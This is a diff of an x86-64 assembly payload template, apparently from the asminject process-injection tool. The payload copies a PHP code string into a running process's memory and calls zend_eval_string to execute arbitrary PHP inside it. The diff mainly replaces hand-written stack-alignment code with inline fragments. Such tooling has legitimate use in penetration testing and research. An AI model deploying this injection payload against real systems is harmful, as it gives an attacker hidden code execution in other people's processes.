@@ -1,7 +1,5 @@
 jmp execute_php_code_main
 
-// FRAGMENT:asminject_copy_bytes.s:FRAGMENT
-
 execute_php_code_main:
 
 	// copy the PHP name and code string to arbitrary read/write memory
@@ -9,8 +7,7 @@ execute_php_code_main:
 	lea rsi, php_name[rip]
 	push rcx
 	mov rcx, [VARIABLE:phpname.length:VARIABLE]
-	add rcx, 2												# null terminator
-	//call asminject_copy_bytes
+	add rcx, 2												# null terminator	//call asminject_copy_bytes
 	rep movsb
 	pop rcx
 	
@@ -20,28 +17,16 @@ execute_php_code_main:
 	push rcx
 	mov rcx, [VARIABLE:phpcode.length:VARIABLE]
 	add rcx, 2												# null terminator
-	// call asminject_copy_bytes
 	rep movsb
 	pop rcx
 	// END: copy the PHP name and code string to arbitrary read/write memory
 	
 	// BEGIN: call zend_eval_string("arbitrary PHP code here")
 	push r10
-	push r8
 	push rdx
-	//even though rbx is not used here, if the push/pop for it isn't present, the target process will segfault on my system
-	push rbx
 	push rax
 	
-	// ensure the stack is 16-byte aligned
-	mov r8, rsp
-	and r8, 0x8
-	cmp r8, 0x8
-	je execute_php_code_call_inner
-	push r8
-
-execute_php_code_call_inner:
-	push r8
+	[INLINE:stack_align-r8-pre.s:INLINE]
 	
 	// arbitrary name
 	mov rax, arbitrary_read_write_data_address[rip]
@@ -54,18 +39,10 @@ execute_php_code_call_inner:
 	mov r10, [SYMBOL_ADDRESS:^zend_eval_string$:IN_BINARY:.+/php($|[0-9\.]+$):SYMBOL_ADDRESS]
 	call r10
 	
-	pop r8
+	[INLINE:stack_align-r8-post.s:INLINE]
 	
-	// remove extra value from the stack if one was added to align it
-	cmp r8, 0x8
-	je execute_php_code_cleanup
-	pop r8
-
-execute_php_code_cleanup:
 	pop rax
-	pop rbx
 	pop rdx
-	pop r8
 	pop r10
 	// END: call zend_eval_string("arbitrary PHP code here")
 
